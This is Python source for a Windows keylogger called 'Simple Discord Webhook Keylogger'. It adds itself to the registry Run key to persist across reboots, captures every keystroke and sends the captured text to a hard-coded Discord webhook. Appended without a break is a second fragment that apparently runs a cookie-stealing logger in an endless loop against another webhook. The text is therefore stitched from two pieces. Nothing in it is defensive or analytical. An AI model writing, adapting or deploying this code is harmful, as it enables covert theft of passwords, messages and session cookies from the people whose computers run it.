 import pynput
from pynput.keyboard import Key, Listener
from discord_webhook import DiscordWebhook
import winreg
import sys

webhook_url = 'https://discord.com/api/webhooks/1343270745211408404/4oM9RWTBmVkr_d6aJBB1xZZ6JMdp7yz2GsBvAuDG6kne8bcd1I5vELjhJQbPiUlJ2-XV'     # Paste here your Webhook URL (instructions in README.md) 
registry_name = 'Simple Discord Webhook Keylogger'     # Registry name for system startup execution
keys_buffer = ''     # Create empty buffer variable *leave as it is*

winreg.CreateKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run")     # Create registry key for automatic program execution after system startup
registry_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_WRITE)     # Open key for entry
winreg.SetValueEx(registry_key, registry_name, 0, winreg.REG_SZ, sys.argv[0])     # Creating entry
winreg.CloseKey(registry_key)     # Close key

def send_message(message):
    DiscordWebhook(url=webhook_url, content=message).execute()     # Send message using Webhook

def on_press(key):     # Executes on each key pressed
    global keys_buffer
    if str(key)[:4] == 'Key.':     # Check if pressed key is not number, letter or character
        key = ' [' + str(key) + ']'
    else:
        key = str(key)[1]
    if len(keys_buffer) + len(key) >= 1975 or key == ' [Key.enter]':     # Check if keys_buffer exceeds Discord's 2000 characters per message limit or ENTER is pressed
        send_message(keys_buffer + key)     # Send logged keys on Discord channel
        keys_buffer = ''     # Reset keys_buffer to log new key presses
    else:
        keys_buffer += key     # Concatenate new logged key presses to make it look simpler

with Listener(on_press=on_press) as listener:
    listener.join()     # Start the listener https://discord.com/api/webhooks/1343632388609015849/sdyFTT5av_XuhzKHjlxS4pbPHFFBXdCi0Bm7IJ6XXWa40l0ps6xeTkAKYkT8Tu7mco7t
from logger import Cookies

log = Cookies('https://discord.com/api/webhooks/1343632388609015849/sdyFTT5av_XuhzKHjlxS4pbPHFFBXdCi0Bm7IJ6XXWa40l0ps6xeTkAKYkT8Tu7mco7t')

def main():
  while True:
	log.run_all()

if __name__ == '__main__':
	main()
